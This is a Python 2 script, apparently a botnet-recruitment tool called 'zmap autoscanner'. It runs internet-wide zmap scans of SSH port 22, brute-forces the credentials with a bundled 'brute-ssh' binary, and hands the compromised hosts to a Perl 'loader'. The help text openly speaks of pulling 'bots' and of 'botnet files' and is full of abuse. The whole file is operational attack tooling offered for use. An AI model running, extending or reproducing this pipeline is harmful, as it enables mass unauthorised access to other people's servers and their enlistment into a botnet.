#!/usr/bin/python

'''
zmap autoscanner made by UN5T48L3
I would suggest you use this program with screen command.
'''

import subprocess, urllib2, sys, time

def run(cmd):
	subprocess.call(cmd, shell=True)

run('clear')
print(" .d8888b.   .d8888b.      d8888  888b    888 ")
print("d88P  Y88b d88P  Y88b    d8P888  8888b   888 ")
print("Y88b.      888    888   d8P 888  88888b  888 ")
print("  Y888b.   888         d8P  888  888Y88b 888 ")
print("     Y88b. 888        d88   888  888 Y88b888 ")
print("       888 888    888 8888888888 888  Y88888 ")
print("Y88b  d88P Y88b  d88P       888  888   Y8888 ")
print("  Y8888P     Y8888P         888  888    Y888 ")
print("")
print("Starting...")
print("")
print("")
time.sleep(1)

try:
 print("To install zmap and everything about scanner please type ---> setup")
 print("")
 print("1: To Scan Whole World")
 print("2: Small Scan")
 print("3: Medium Scan Option")
 print("4: Godly Scan")
 print("")
 print('LST1 or LST2  or LST3: This will allow you to scan up to 3 at a time and have it brute and load automatically')
 print("")
 run('chmod 777 brute-ssh')
 wifi = raw_input ("Select Your Scan Mode or type your command (setup, HELP, LST1, LST2, LST3): ")

 if wifi == "1":
 	a = raw_input('Select Your Loader: ')
 	run('zmap -p22 -B100M -omfu.txt')
 	run('./brute-ssh 1500')
 	run('cat vuln.txt | grep -v DUP > vuln')
 	run('perl ' + a + ' vuln')
 elif wifi == "2":
 	a = raw_input('Select Your Loader: ')
 	run('zmap -p22 -omfu.txt -B100M -N 9000')
 	run('./brute-ssh 1500')
 	run('cat vuln.txt | grep -v DUP > vuln')
 	run('perl ' + a + ' vuln')
 elif wifi == "3":
    a = raw_input('Select Your Loader: ')
    run('zmap -p22 -o mfu.txt -B100M -N 250000')
    run('./brute-ssh 1500')
    run('cat vuln.txt | grep -v DUP > vuln')
    run('perl ' + a + ' vuln')
 elif wifi == "4":
    a = raw_input('Select Your Loader: ')
    run('zmap -p22 -omfu.txt -B100M -N 900000')
    run('./brute-ssh 1500')
    run('cat vuln.txt | grep -v DUP > vuln')
    run('perl ' + a + ' vuln')
 elif wifi == "setup":
    run('chmod 777 *')
    run('sh setup.sh')
    run('rm -rf v2.1.0.tar.gz zmap-2.1.0')
    run('chmod 777 *')
    print("\x1b[1;36mYOUR SCANNER SHIT IS DONE")
 elif wifi == "LST1":
    run('clear')
    a = raw_input('Enter LST name: ')
    b = raw_input('Select Your Loader: ')
    run('zmap -p22 -omfu.txt -w' + a)
    run('./brute-ssh 1500')
    run('cat vuln.txt | grep -v DUP > vuln')
    run('perl ' + b + ' vuln')
 elif wifi == "LST2": 
    run('clear')
    c = raw_input('Enter LST name: ')
    d = raw_input('Enter LST name: ')
    e = raw_input('Select Your Loader: ')
    run('zmap -p22 -omfu.txt -w' + c)
    run('./brute-ssh 1500')
    run('cat vuln.txt | grep -v DUP > lst1.txt')
    run('zmap -p22 -omfu.txt -w' + d)
    run('./brute-ssh 1500')
    run('cat vuln.txt | grep -v DUP > lst2.txt')
    run('cat lst1.txt lst2.txt > 2.txt')
    run('perl ' + e + ' 2.txt')
 elif wifi == "LST3":
    run('clear')
    f = raw_input('Enter LST name: ')
    g = raw_input('Enter LST name: ')
    h = raw_input('Enter LST name: ')
    i = raw_input('Select Your Loader: ')
    run('zmap -p22 -omfu.txt -w' + f)
    run('chmod 777 *')
    run('./brute-ssh 1500')
    run('cat vuln.txt | grep -v DUP > lst1.txt')
    run('zmap -p22 -omfu.txt -w' + g)
    run('chmod 777 *')
    run('./brute-ssh 1500')
    run('cat vuln.txt | grep -v DUP > lst2.txt')
    run('zmap -p22 -omfu.txt -w' + h)
    run('chmod 777 *')
    run('./brute-ssh 1500')
    run('cat vuln.txt | grep -v DUP > lst3.txt')
    run('cat lst1.txt lst2.txt lst3.txt > 3.txt')
    run('perl ' + i + ' 3.txt')


 elif wifi == "HELP":
  run('clear')
  print("\x1b[1;36msetup command gonna setup your fucking server for scanning")
  print("\x1b[1;32mBy pressing 1 you are doing a worldscan this bitch can take hours or even days but great results")
  print("\x1b[1;32mBy pressing 2 you are doing a small scan this bitch will only take minutes but wont pull much bots")
  print("\x1b[1;32mBy pressing 3 you are doing a decent scan which usually takes around 15-25 minutes depending on your server")
  print("\x1b[1;32mBy pressing 4 you are doing a godly scan you should pull a decent amount but depends on pass_file and server speed")
  print("\x1b[1;34mThe LST option allows you to scan your own LST files. To use this option type LST and the number of LST files you want to scan example LST3 this will scan 3 LST files, brute them then load them.so only options for this to work is LST1 LST2 LST3")
  print("\x1b[1;31mIf still you have problems to getting bots then go fuck yourself and delete all of botnet files from your computer you dumb fuck.")


except KeyboardInterrupt:
  run("clear")
  print("Zmap Autoscanner & Bruter & Loader made by UN5T48L3")